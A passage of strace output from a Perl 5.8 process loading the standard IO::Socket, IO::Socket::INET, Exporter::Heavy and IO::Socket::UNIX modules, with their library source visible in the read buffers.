\"\";\n}\n\ntie %!, __PACKAGE__;\n\n1;\n__END__\n\n", 4096) = 1871
10004 07:30:53.735774 _llseek(8, 5966, [5966], SEEK_SET) = 0
10004 07:30:53.735819 _llseek(8, 0, [5966], SEEK_CUR) = 0
10004 07:30:53.735846 close(8)          = 0
10004 07:30:53.736179 brk(0x827b000)    = 0x827b000
10004 07:30:53.736366 read(6, "    }\n\n    $peer = accept($new,$sock)\n\tor return;\n\n    return wantarray ? ($new, $peer)\n    \t      \t     : $new;\n}\n\nsub sockname {\n    @_ == 1 or croak \'usage: $sock->sockname()\';\n    getsockname($_[0]);\n}\n\nsub peername {\n    @_ == 1 or croak \'usage: $sock->peername()\';\n    my($sock) = @_;\n    getpeername($sock)\n      || ${*$sock}{\'io_socket_peername\'}\n      || undef;\n}\n\nsub connected {\n    @_ == 1 or croak \'usage: $sock->connected()\';\n    my($sock) = @_;\n    getpeername($sock);\n}\n\nsub send {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $sock->send(BUF, [FLAGS, [TO]])\';\n    my $sock  = $_[0];\n    my $flags = $_[2] || 0;\n    my $peer  = $_[3] || $sock->peername;\n\n    croak \'send: Cannot determine peer address\'\n\t unless($peer);\n\n    my $r = defined(getpeername($sock))\n\t? send($sock, $_[1], $flags)\n\t: send($sock, $_[1], $flags, $peer);\n\n    # remember who we send to, if it was successful\n    ${*$sock}{\'io_socket_peername\'} = $peer\n\tif(@_ == 4 && defined $r);\n\n    $r;\n}\n\nsub recv {\n    @_ == 3 || @_ == 4 or croak \'usage: $sock->recv(BUF, LEN [, FLAGS])\';\n    my $sock  = $_[0];\n    my $len   = $_[2];\n    my $flags = $_[3] || 0;\n\n    # remember who we recv\'d from\n    ${*$sock}{\'io_socket_peername\'} = recv($sock, $_[1]=\'\', $len, $flags);\n}\n\nsub shutdown {\n    @_ == 2 or croak \'usage: $sock->shutdown(HOW)\';\n    my($sock, $how) = @_;\n    shutdown($sock, $how);\n}\n\nsub setsockopt {\n    @_ == 4 or croak \'$sock->setsockopt(LEVEL, OPTNAME)\';\n    setsockopt($_[0],$_[1],$_[2],$_[3]);\n}\n\nmy $intsize = length(pack(\"i\",0));\n\nsub getsockopt {\n    @_ == 3 or croak \'$sock->getsockopt(LEVEL, OPTNAME)\';\n    my $r = getsockopt($_[0],$_[1],$_[2]);\n    # Just a guess\n    $r = unpack(\"i\", $r)\n\tif(defined $r && length($r) == $intsize);\n    $r;\n}\n\nsub sockopt {\n    my $sock = shift;\n    @_ == 1 ? $sock->getsockopt(SOL_SOCKET,@_)\n\t    : $sock->setsockopt(SOL_SOCKET,@_);\n}\n\nsub atmark {\n    @_ == 1 or croak \'usage: $sock->atmark()\';\n    my($sock) = @_;\n    sockatmark($sock);\n}\n\nsub timeout {\n    @_ == 1 || @_ == 2 or croak \'usage: $sock->timeout([VALUE])\';\n    my($sock,$val) = @_;\n    my $r = ${*$sock}{\'io_socket_timeout\'};\n\n    ${*$sock}{\'io_socket_timeout\'} = defined $val ? 0 + $val : $val\n\tif(@_ == 2);\n\n    $r;\n}\n\nsub sockdomain {\n    @_ == 1 or croak \'usage: $sock->sockdomain()\';\n    my $sock = shift;\n    ${*$sock}{\'io_socket_domain\'};\n}\n\nsub socktype {\n    @_ == 1 or croak \'usage: $sock->socktype()\';\n    my $sock = shift;\n    ${*$sock}{\'io_socket_type\'}\n}\n\nsub protocol {\n    @_ == 1 or croak \'usage: $sock->protocol()\';\n    my($sock) = @_;\n    ${*$sock}{\'io_socket_proto\'};\n}\n\n1;\n\n__END__\n\n", 4096) = 2603
10004 07:30:53.736880 _llseek(6, 6698, [6698], SEEK_SET) = 0
10004 07:30:53.736897 _llseek(6, 0, [6698], SEEK_CUR) = 0
10004 07:30:53.736907 close(6)          = 0
10004 07:30:53.736926 stat64("/etc/perl/IO/Socket/INET.pmc", 0xbfeedc3c) = -1 ENOENT (No such file or directory)
10004 07:30:53.736940 stat64("/etc/perl/IO/Socket/INET.pm", 0xbfeedb4c) = -1 ENOENT (No such file or directory)
10004 07:30:53.736954 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/INET.pmc", 0xbfeedc3c) = -1 ENOENT (No such file or directory)
10004 07:30:53.736967 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/INET.pm", 0xbfeedb4c) = -1 ENOENT (No such file or directory)
10004 07:30:53.736981 stat64("/usr/local/share/perl/5.8.8/IO/Socket/INET.pmc", 0xbfeedc3c) = -1 ENOENT (No such file or directory)
10004 07:30:53.736994 stat64("/usr/local/share/perl/5.8.8/IO/Socket/INET.pm", 0xbfeedb4c) = -1 ENOENT (No such file or directory)
10004 07:30:53.737008 stat64("/usr/lib/perl5/IO/Socket/INET.pmc", 0xbfeedc3c) = -1 ENOENT (No such file or directory)
10004 07:30:53.737020 stat64("/usr/lib/perl5/IO/Socket/INET.pm", 0xbfeedb4c) = -1 ENOENT (No such file or directory)
10004 07:30:53.737034 stat64("/usr/share/perl5/IO/Socket/INET.pmc", 0xbfeedc3c) = -1 ENOENT (No such file or directory)
10004 07:30:53.737046 stat64("/usr/share/perl5/IO/Socket/INET.pm", 0xbfeedb4c) = -1 ENOENT (No such file or directory)
10004 07:30:53.737059 stat64("/usr/lib/perl/5.8/IO/Socket/INET.pmc", 0xbfeedc3c) = -1 ENOENT (No such file or directory)
10004 07:30:53.737073 stat64("/usr/lib/perl/5.8/IO/Socket/INET.pm", {st_mode=S_IFREG|0644, st_size=6497, ...}) = 0
10004 07:30:53.737094 open("/usr/lib/perl/5.8/IO/Socket/INET.pm", O_RDONLY|O_LARGEFILE) = 6
10004 07:30:53.737109 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfeed958) = -1 ENOTTY (Inappropriate ioctl for device)
10004 07:30:53.737120 _llseek(6, 0, [0], SEEK_CUR) = 0
10004 07:30:53.737137 read(6, "# IO::Socket::INET.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket::INET;\n\nuse strict;\nour(@ISA, $VERSION);\nuse IO::Socket;\nuse Socket;\nuse Carp;\nuse Exporter;\nuse Errno;\n\n@ISA = qw(IO::Socket);\n$VERSION = \"1.29\";\n\nmy $EINVAL = exists(&Errno::EINVAL) ? Errno::EINVAL() : 1;\n\nIO::Socket::INET->register_domain( AF_INET );\n\nmy %socket_type = ( tcp  => SOCK_STREAM,\n\t\t    udp  => SOCK_DGRAM,\n\t\t    icmp => SOCK_RAW\n\t\t  );\n\nsub new {\n    my $class = shift;\n    unshift(@_, \"PeerAddr\") if @_ == 1;\n    return $class->SUPER::new(@_);\n}\n\nsub _sock_info {\n  my($addr,$port,$proto) = @_;\n  my $origport = $port;\n  my @proto = ();\n  my @serv = ();\n\n  $port = $1\n\tif(defined $addr && $addr =~ s,:([\\w\\(\\)/]+)$,,);\n\n  if(defined $proto  && $proto =~ /\\D/) {\n    if(@proto = getprotobyname($proto)) {\n      $proto = $proto[2] || undef;\n    }\n    else {\n      $@ = \"Bad protocol \'$proto\'\";\n      return;\n    }\n  }\n\n  if(defined $port) {\n    my $defport = ($port =~ s,\\((\\d+)\\)$,,) ? $1 : undef;\n    my $pnum = ($port =~ m,^(\\d+)$,)[0];\n\n    @serv = getservbyname($port, $proto[0] || \"\")\n\tif ($port =~ m,\\D,);\n\n    $port = $serv[2] || $defport || $pnum;\n    unless (defined $port) {\n\t$@ = \"Bad service \'$origport\'\";\n\treturn;\n    }\n\n    $proto = (getprotobyname($serv[3]))[2] || undef\n\tif @serv && !$proto;\n  }\n\n return ($addr || undef,\n\t $port || undef,\n\t $proto || undef\n\t);\n}\n\nsub _error {\n    my $sock = shift;\n    my $err = shift;\n    {\n      local($!);\n      my $title = ref($sock).\": \";\n      $@ = join(\"\", $_[0] =~ /^$title/ ? \"\" : $title, @_);\n      close($sock)\n\tif(defined fileno($sock));\n    }\n    $! = $err;\n    return undef;\n}\n\nsub _get_addr {\n    my($sock,$addr_str, $multi) = @_;\n    my @addr;\n    if ($multi && $addr_str !~ /^\\d+(?:\\.\\d+){3}$/) {\n\t(undef, undef, undef, undef, @addr) = gethostbyname($addr_str);\n    } else {\n\tmy $h = inet_aton($addr_str);\n\tpush(@addr, $h) if defined $h;\n    }\n    @addr;\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my($lport,$rport,$laddr,$raddr,$proto,$type);\n\n    $arg->{LocalAddr} = $arg->{LocalHost}\n\tif exists $arg->{LocalHost} && !exists $arg->{LocalAddr};\n\n    ($laddr,$lport,$proto) = _sock_info($arg->{LocalAddr},\n\t\t\t\t\t$arg->{LocalPort},\n\t\t\t\t\t$arg->{Proto})\n\t\t\tor return _error($sock, $!, $@);\n\n    $laddr = defined $laddr ? inet_aton($laddr)\n\t\t\t    : INADDR_ANY;\n\n    return _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{LocalAddr},\"\'\")\n\tunless(defined $laddr);\n\n    $arg->{PeerAddr} = $arg->{PeerHost}\n\tif exists $arg->{PeerHost} && !exists $arg->{PeerAddr};\n\n    unless(exists $arg->{Listen}) {\n\t($raddr,$rport,$proto) = _sock_info($arg->{PeerAddr},\n\t\t\t\t\t    $arg->{PeerPort},\n\t\t\t\t\t    $proto)\n\t\t\tor return _error($sock, $!, $@);\n    }\n\n    $proto ||= (getprotobyname(\'tcp\'))[2];\n\n    my $pname = (getprotobynumber($proto))[0];\n    $type = $arg->{Type} || $socket_type{lc $pname};\n\n    my @raddr = ();\n\n    if(defined $raddr) {\n\t@raddr = $sock->_get_addr($raddr, $arg->{MultiHomed});\n\treturn _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{PeerAddr},\"\'\")\n\t    unless @raddr;\n    }\n\n    while(1) {\n\n\t$sock->socket(AF_INET, $type, $proto) or\n\t    return _error($sock, $!, \"$!\");\n\n        if (defined $arg->{Blocking}) {\n\t    defined $sock->blocking($arg->{Blocking})\n\t\tor return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{Reuse} || $arg->{ReuseAddr}) {\n\t    $sock->sockopt(SO_REUSEADDR,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{ReusePort}) {\n\t    $sock->sockopt(SO_REUSEPORT,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{Broadcast}) {\n\t\t$sock->sockopt(SO_BROADCAST,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif($lport || ($laddr ne INADDR_ANY) || exists $arg->{Listen}) {\n\t    $sock->bind($lport || 0, $laddr) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif(exists $arg->{Listen}) {\n\t    $sock->listen($arg->{Listen} || 5) or\n\t\treturn _error($sock, $!, \"$!\");\n\t    last;\n\t}\n\n \t# don\'t try to connect unless we\'re given a PeerAddr\n \tlast unless e", 4096) = 4096
10004 07:30:53.737528 stat64("/etc/perl/Exporter/Heavy.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.737544 stat64("/etc/perl/Exporter/Heavy.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.737558 stat64("/usr/local/lib/perl/5.8.8/Exporter/Heavy.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.737571 stat64("/usr/local/lib/perl/5.8.8/Exporter/Heavy.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.737585 stat64("/usr/local/share/perl/5.8.8/Exporter/Heavy.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.737598 stat64("/usr/local/share/perl/5.8.8/Exporter/Heavy.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.737612 stat64("/usr/lib/perl5/Exporter/Heavy.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.737624 stat64("/usr/lib/perl5/Exporter/Heavy.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.737638 stat64("/usr/share/perl5/Exporter/Heavy.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.737650 stat64("/usr/share/perl5/Exporter/Heavy.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.737663 stat64("/usr/lib/perl/5.8/Exporter/Heavy.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.737676 stat64("/usr/lib/perl/5.8/Exporter/Heavy.pm", 0xbfeed69c) = -1 ENOENT (No such file or directory)
10004 07:30:53.737690 stat64("/usr/share/perl/5.8/Exporter/Heavy.pmc", 0xbfeed78c) = -1 ENOENT (No such file or directory)
10004 07:30:53.737706 stat64("/usr/share/perl/5.8/Exporter/Heavy.pm", {st_mode=S_IFREG|0644, st_size=6252, ...}) = 0
10004 07:30:53.737728 open("/usr/share/perl/5.8/Exporter/Heavy.pm", O_RDONLY|O_LARGEFILE) = 8
10004 07:30:53.737742 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfeed4a8) = -1 ENOTTY (Inappropriate ioctl for device)
10004 07:30:53.737765 _llseek(8, 0, [0], SEEK_CUR) = 0
10004 07:30:53.737810 read(8, "package Exporter::Heavy;\n\nuse strict;\nno strict \'refs\';\n\n# On one line so MakeMaker will see it.\nrequire Exporter;  our $VERSION = $Exporter::VERSION;\n$Carp::Internal{\"Exporter::Heavy\"} = 1;\n\n#\n# We go to a lot of trouble not to \'require Carp\' at file scope,\n#  because Carp requires Exporter, and something has to give.\n#\n\nsub _rebuild_cache {\n    my ($pkg, $exports, $cache) = @_;\n    s/^&// foreach @$exports;\n    @{$cache}{@$exports} = (1) x @$exports;\n    my $ok = \\@{\"${pkg}::EXPORT_OK\"};\n    if (@$ok) {\n\ts/^&// foreach @$ok;\n\t@{$cache}{@$ok} = (1) x @$ok;\n    }\n}\n\nsub heavy_export {\n\n    # First make import warnings look like they\'re coming from the \"use\".\n    local $SIG{__WARN__} = sub {\n\tmy $text = shift;\n\tif ($text =~ s/ at \\S*Exporter\\S*.pm line \\d+.*\\n//) {\n\t    require Carp;\n\t    local $Carp::CarpLevel = 1;\t# ignore package calling us too.\n\t    Carp::carp($text);\n\t}\n\telse {\n\t    warn $text;\n\t}\n    };\n    local $SIG{__DIE__} = sub {\n\trequire Carp;\n\tlocal $Carp::CarpLevel = 1;\t# ignore package calling us too.\n\tCarp::croak(\"$_[0]Illegal null symbol in \\@${1}::EXPORT\")\n\t    if $_[0] =~ /^Unable to create sub named \"(.*?)::\"/;\n    };\n\n    my($pkg, $callpkg, @imports) = @_;\n    my($type, $sym, $cache_is_current, $oops);\n    my($exports, $export_cache) = (\\@{\"${pkg}::EXPORT\"},\n                                   $Exporter::Cache{$pkg} ||= {});\n\n    if (@imports) {\n\tif (!%$export_cache) {\n\t    _rebuild_cache ($pkg, $exports, $export_cache);\n\t    $cache_is_current = 1;\n\t}\n\n\tif (grep m{^[/!:]}, @imports) {\n\t    my $tagsref = \\%{\"${pkg}::EXPORT_TAGS\"};\n\t    my $tagdata;\n\t    my %imports;\n\t    my($remove, $spec, @names, @allexports);\n\t    # negated first item implies starting with default set:\n\t    unshift @imports, \':DEFAULT\' if $imports[0] =~ m/^!/;\n\t    foreach $spec (@imports){\n\t\t$remove = $spec =~ s/^!//;\n\n\t\tif ($spec =~ s/^://){\n\t\t    if ($spec eq \'DEFAULT\'){\n\t\t\t@names = @$exports;\n\t\t    }\n\t\t    elsif ($tagdata = $tagsref->{$spec}) {\n\t\t\t@names = @$tagdata;\n\t\t    }\n\t\t    else {\n\t\t\twarn qq[\"$spec\" is not defined in %${pkg}::EXPORT_TAGS];\n\t\t\t++$oops;\n\t\t\tnext;\n\t\t    }\n\t\t}\n\t\telsif ($spec =~ m:^/(.*)/$:){\n\t\t    my $patn = $1;\n\t\t    @allexports = keys %$export_cache unless @allexports; # only do keys once\n\t\t    @names = grep(/$patn/, @allexports); # not anchored by default\n\t\t}\n\t\telse {\n\t\t    @names = ($spec); # is a normal symbol name\n\t\t}\n\n\t\twarn \"Import \".($remove ? \"del\":\"add\").\": @names \"\n\t\t    if $Exporter::Verbose;\n\n\t\tif ($remove) {\n\t\t   foreach $sym (@names) { delete $imports{$sym} } \n\t\t}\n\t\telse {\n\t\t    @imports{@names} = (1) x @names;\n\t\t}\n\t    }\n\t    @imports = keys %imports;\n\t}\n\n        my @carp;\n\tforeach $sym (@imports) {\n\t    if (!$export_cache->{$sym}) {\n\t\tif ($sym =~ m/^\\d/) {\n\t\t    $pkg->VERSION($sym); # inherit from UNIVERSAL\n\t\t    # If the version number was the only thing specified\n\t\t    # then we should act as if nothing was specified:\n\t\t    if (@imports == 1) {\n\t\t\t@imports = @$exports;\n\t\t\tlast;\n\t\t    }\n\t\t    # We need a way to emulate \'use Foo ()\' but still\n\t\t    # allow an easy version check: \"use Foo 1.23, \'\'\";\n\t\t    if (@imports == 2 and !$imports[1]) {\n\t\t\t@imports = ();\n\t\t\tlast;\n\t\t    }\n\t\t} elsif ($sym !~ s/^&// || !$export_cache->{$sym}) {\n\t\t    # Last chance - see if they\'ve updated EXPORT_OK since we\n\t\t    # cached it.\n\n\t\t    unless ($cache_is_current) {\n\t\t\t%$export_cache = ();\n\t\t\t_rebuild_cache ($pkg, $exports, $export_cache);\n\t\t\t$cache_is_current = 1;\n\t\t    }\n\n\t\t    if (!$export_cache->{$sym}) {\n\t\t\t# accumulate the non-exports\n\t\t\tpush @carp,\n\t\t\t  qq[\"$sym\" is not exported by the $pkg module\\n];\n\t\t\t$oops++;\n\t\t    }\n\t\t}\n\t    }\n\t}\n\tif ($oops) {\n\t    require Carp;\n\t    Carp::croak(\"@{carp}Can\'t continue after import errors\");\n\t}\n    }\n    else {\n\t@imports = @$exports;\n    }\n\n    my($fail, $fail_cache) = (\\@{\"${pkg}::EXPORT_FAIL\"},\n                              $Exporter::FailCache{$pkg} ||= {});\n\n    if (@$fail) {\n\tif (!%$fail_cache) {\n\t    # Build cache of symbols. Optimise the lookup by adding\n\t    # barewords twice... both with and without a leading &.\n\t    # (Technique could be applied to $export_cac", 4096) = 4096
10004 07:30:53.738537 read(8, "he at cost of memory)\n\t    my @expanded = map { /^\\w/ ? ($_, \'&\'.$_) : $_ } @$fail;\n\t    warn \"${pkg}::EXPORT_FAIL cached: @expanded\" if $Exporter::Verbose;\n\t    @{$fail_cache}{@expanded} = (1) x @expanded;\n\t}\n\tmy @failed;\n\tforeach $sym (@imports) { push(@failed, $sym) if $fail_cache->{$sym} }\n\tif (@failed) {\n\t    @failed = $pkg->export_fail(@failed);\n\t    foreach $sym (@failed) {\n                require Carp;\n\t\tCarp::carp(qq[\"$sym\" is not implemented by the $pkg module ],\n\t\t\t\"on this architecture\");\n\t    }\n\t    if (@failed) {\n\t\trequire Carp;\n\t\tCarp::croak(\"Can\'t continue after import errors\");\n\t    }\n\t}\n    }\n\n    warn \"Importing into $callpkg from $pkg: \",\n\t\tjoin(\", \",sort @imports) if $Exporter::Verbose;\n\n    foreach $sym (@imports) {\n\t# shortcut for the common case of no type character\n\t(*{\"${callpkg}::$sym\"} = \\&{\"${pkg}::$sym\"}, next)\n\t    unless $sym =~ s/^(\\W)//;\n\t$type = $1;\n\t*{\"${callpkg}::$sym\"} =\n\t    $type eq \'&\' ? \\&{\"${pkg}::$sym\"} :\n\t    $type eq \'$\' ? \\${\"${pkg}::$sym\"} :\n\t    $type eq \'@\' ? \\@{\"${pkg}::$sym\"} :\n\t    $type eq \'%\' ? \\%{\"${pkg}::$sym\"} :\n\t    $type eq \'*\' ?  *{\"${pkg}::$sym\"} :\n\t    do { require Carp; Carp::croak(\"Can\'t export symbol: $type$sym\") };\n    }\n}\n\nsub heavy_export_to_level\n{\n      my $pkg = shift;\n      my $level = shift;\n      (undef) = shift;\t\t\t# XXX redundant arg\n      my $callpkg = caller($level);\n      $pkg->export($callpkg, @_);\n}\n\n# Utility functions\n\nsub _push_tags {\n    my($pkg, $var, $syms) = @_;\n    my @nontag = ();\n    my $export_tags = \\%{\"${pkg}::EXPORT_TAGS\"};\n    push(@{\"${pkg}::$var\"},\n\tmap { $export_tags->{$_} ? @{$export_tags->{$_}} \n                                 : scalar(push(@nontag,$_),$_) }\n\t\t(@$syms) ? @$syms : keys %$export_tags);\n    if (@nontag and $^W) {\n\t# This may change to a die one day\n\trequire Carp;\n\tCarp::carp(join(\", \", @nontag).\" are not tags of $pkg\");\n    }\n}\n\nsub heavy_require_version {\n    my($self, $wanted) = @_;\n    my $pkg = ref $self || $self;\n    return ${pkg}->VERSION($wanted);\n}\n\nsub heavy_export_tags {\n  _push_tags((caller)[0], \"EXPORT\",    \\@_);\n}\n\nsub heavy_export_ok_tags {\n  _push_tags((caller)[0], \"EXPORT_OK\", \\@_);\n}\n\n1;\n", 4096) = 2156
10004 07:30:53.738735 brk(0x829c000)    = 0x829c000
10004 07:30:53.739062 read(8, "", 4096) = 0
10004 07:30:53.739077 close(8)          = 0
10004 07:30:53.740216 read(6, "xists($arg->{PeerAddr});\n \n        $raddr = shift @raddr;\n\n\treturn _error($sock, $EINVAL, \'Cannot determine remote port\')\n\t\tunless($rport || $type == SOCK_DGRAM || $type == SOCK_RAW);\n\n\tlast\n\t    unless($type == SOCK_STREAM || defined $raddr);\n\n\treturn _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{PeerAddr},\"\'\")\n\t    unless defined $raddr;\n\n#        my $timeout = ${*$sock}{\'io_socket_timeout\'};\n#        my $before = time() if $timeout;\n\n\tundef $@;\n        if ($sock->connect(pack_sockaddr_in($rport, $raddr))) {\n#            ${*$sock}{\'io_socket_timeout\'} = $timeout;\n            return $sock;\n        }\n\n\treturn _error($sock, $!, $@ || \"Timeout\")\n\t    unless @raddr;\n\n#\tif ($timeout) {\n#\t    my $new_timeout = $timeout - (time() - $before);\n#\t    return _error($sock,\n#                         (exists(&Errno::ETIMEDOUT) ? Errno::ETIMEDOUT() : $EINVAL),\n#                         \"Timeout\") if $new_timeout <= 0;\n#\t    ${*$sock}{\'io_socket_timeout\'} = $new_timeout;\n#        }\n\n    }\n\n    $sock;\n}\n\nsub connect {\n    @_ == 2 || @_ == 3 or\n       croak \'usage: $sock->connect(NAME) or $sock->connect(PORT, ADDR)\';\n    my $sock = shift;\n    return $sock->SUPER::connect(@_ == 1 ? shift : pack_sockaddr_in(@_));\n}\n\nsub bind {\n    @_ == 2 || @_ == 3 or\n       croak \'usage: $sock->bind(NAME) or $sock->bind(PORT, ADDR)\';\n    my $sock = shift;\n    return $sock->SUPER::bind(@_ == 1 ? shift : pack_sockaddr_in(@_))\n}\n\nsub sockaddr {\n    @_ == 1 or croak \'usage: $sock->sockaddr()\';\n    my($sock) = @_;\n    my $name = $sock->sockname;\n    $name ? (sockaddr_in($name))[1] : undef;\n}\n\nsub sockport {\n    @_ == 1 or croak \'usage: $sock->sockport()\';\n    my($sock) = @_;\n    my $name = $sock->sockname;\n    $name ? (sockaddr_in($name))[0] : undef;\n}\n\nsub sockhost {\n    @_ == 1 or croak \'usage: $sock->sockhost()\';\n    my($sock) = @_;\n    my $addr = $sock->sockaddr;\n    $addr ? inet_ntoa($addr) : undef;\n}\n\nsub peeraddr {\n    @_ == 1 or croak \'usage: $sock->peeraddr()\';\n    my($sock) = @_;\n    my $name = $sock->peername;\n    $name ? (sockaddr_in($name))[1] : undef;\n}\n\nsub peerport {\n    @_ == 1 or croak \'usage: $sock->peerport()\';\n    my($sock) = @_;\n    my $name = $sock->peername;\n    $name ? (sockaddr_in($name))[0] : undef;\n}\n\nsub peerhost {\n    @_ == 1 or croak \'usage: $sock->peerhost()\';\n    my($sock) = @_;\n    my $addr = $sock->peeraddr;\n    $addr ? inet_ntoa($addr) : undef;\n}\n\n1;\n\n__END__\n\n", 4096) = 2401
10004 07:30:53.740357 _llseek(6, 6496, [6496], SEEK_SET) = 0
10004 07:30:53.740373 _llseek(6, 0, [6496], SEEK_CUR) = 0
10004 07:30:53.740384 close(6)          = 0
10004 07:30:53.740487 stat64("/etc/perl/IO/Socket/UNIX.pmc", 0xbfeedc3c) = -1 ENOENT (No such file or directory)
10004 07:30:53.740522 stat64("/etc/perl/IO/Socket/UNIX.pm", 0xbfeedb4c) = -1 ENOENT (No such file or directory)
10004 07:30:53.740536 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/UNIX.pmc", 0xbfeedc3c) = -1 ENOENT (No such file or directory)
10004 07:30:53.740549 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/UNIX.pm", 0xbfeedb4c) = -1 ENOENT (No such file or directory)
10004 07:30:53.740563 stat64("/usr/local/share/perl/5.8.8/IO/Socket/UNIX.pmc", 0xbfeedc3c) = -1 ENOENT (No such file or directory)
10004 07:30:53.740576 stat64("/usr/local/share/perl/5.8.8/IO/Socket/UNIX.pm", 0xbfeedb4c) = -1 ENOENT (No such file or directory)
10004 07:30:53.740590 stat64("/usr/lib/perl5/IO/Socket/UNIX.pmc", 0xbfeedc3c) = -1 ENOENT (No such file or directory)
10004 07:30:53.740602 stat64("/usr/lib/perl5/IO/Socket/UNIX.pm", 0xbfeedb4c) = -1 ENOENT (No such file or directory)
10004 07:30:53.740616 stat64("/usr/share/perl5/IO/Socket/UNIX.pmc", 0xbfeedc3c) = -1 ENOENT (No such file or directory)
10004 07:30:53.740628 stat64("/usr/share/perl5/IO/Socket/UNIX.pm", 0xbfeedb4c) = -1 ENOENT (No such file or directory)
10004 07:30:53.740641 stat64("/usr/lib/perl/5.8/IO/Socket/UNIX.pmc", 0xbfeedc3c) = -1 ENOENT (No such file or directory)
10004 07:30:53.740655 stat64("/usr/lib/perl/5.8/IO/Socket/UNIX.pm", {st_mode=S_IFREG|0644, st_size=1387, ...}) = 0
10004 07:30:53.740676 open("/usr/lib/perl/5.8/IO/Socket/UNIX.pm", O_RDONLY|O_LARGEFILE) = 6
10004 07:30:53.740691 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfeed958) = -1 ENOTTY (Inappropriate ioctl for device)
10004 07:30:53.740703 _llseek(6, 0, [0], SEEK_CUR) = 0
10004 07:30:53.740718 brk(0x82bd000)    = 0x82bd000
10004 07:30:53.740735 read(6, "# IO::Socket::UNIX.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket::UNIX;\n\nuse strict;\nour(@ISA, $VERSION);\nuse IO::Socket;\nuse Socket;\nuse Carp;\n\n@ISA = qw(IO::Socket);\n$VERSION = \"1.22\";\n$VERSION = eval $VERSION;\n\nIO::Socket::UNIX->register_domain( AF_UNIX );\n\nsub new {\n    my $class = shift;\n    unshift(@_, \"Peer\") if @_ == 1;\n    return $class->SUPER::new(@_);\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my($bport,$cport);\n\n    my $type = $arg->{Type} || SOCK_STREAM;\n\n    $sock->socket(AF_UNIX, $type, 0) or\n\treturn undef;\n\n    if(exists $arg->{Local}) {\n\tmy $addr = sockaddr_un($arg->{Local});\n\t$sock->bind($addr) or\n\t    return undef;\n    }\n    if(exists $arg->{Listen} && $type != SOCK_DGRAM) {\n\t$sock->listen($arg->{Listen} || 5) or\n\t    return undef;\n    }\n    elsif(exists $arg->{Peer}) {\n\tmy $addr = sockaddr_un($arg->{Peer});\n\t$sock->connect($addr) or\n\t    return undef;\n    }\n\n    $sock;\n}\n\nsub hostpath {\n    @_ == 1 or croak \'usage: $sock->hostpath()\';\n    my $n = $_[0]->sockname || return undef;\n    (sockaddr_un($n))[0];\n}\n\nsub peerpath {\n    @_ == 1 or croak \'usage: $sock->peerpath()\';\n    my $n = $_[0]->peername || return undef;\n    (sockaddr_un($n))[0];\n}\n\n1; # Keep require happy\n\n__END__\n\n", 4096) = 1387
10004 07:30:53.741756 _llseek(6, 1386, [1386], SEEK_SET) = 0
10004 07:30:53.741773 _llseek(6, 0, [1386], SEEK_CUR) = 0
10004 07:30:53.741784 close(6)          = 0
10004 07:30:53.741837 stat64("/etc/perl/IO/Dir.pmc", 0xbfeedc3c) = -1 ENOENT (No such file or directory)
10004 07:30:53.741853 stat64("/etc/perl/IO/Dir.pm", 0xbfeedb4c) = -1 ENOENT (No such file or directory)
10004 07:30:53.741866 stat64("/usr/local/lib/perl/5.8.8/IO/Dir.pmc", 0xbfeedc3c) = -1 ENOENT (No such file or directory)
10004 07:30:53.741879 stat64("/usr/local/lib/perl/5.8.8/IO/Dir.pm", 0xbfeedb4c) = -1 ENOENT (No such file or directory)
10004 07:30:53.741893 stat64("/usr/local/share/perl/5.8.8/IO/Dir.pmc", 0xbfeedc3c) = -1 ENOENT (No such file or directory)
10004 07:30:53.741905 stat64("/usr/local/share/perl/5.8.8/IO/Dir.pm", 0xbfeedb4c) = -1 ENOENT (No such file or directory)
10004 07:30:53.741932 stat64("/usr/lib/perl5/IO/Dir.pmc", 0xbfeedc3c) = -1 ENOENT (No such file or directory)
10004 07:30:53.741972 stat64("/usr/lib/perl5/IO/Dir.pm", 0xbfeedb4c) = -1 ENOENT (No such file or directory)
10004 07:30:53.741986 stat64("/usr/share/perl5/IO/Dir.pmc", 0xbfeedc3c) = -1 ENOENT (No such file or directory)
10004 07:30:53.742015 stat64("/usr/share/perl5/IO/Dir.pm", 0xbfeedb4c) = -1 ENOENT (No such file or directory)
10004 07:30:53.742028 stat64("/usr/lib/perl/5.8/IO/Dir.pmc", 0xbfeedc3c) = -1 ENOENT (No such file or directory)
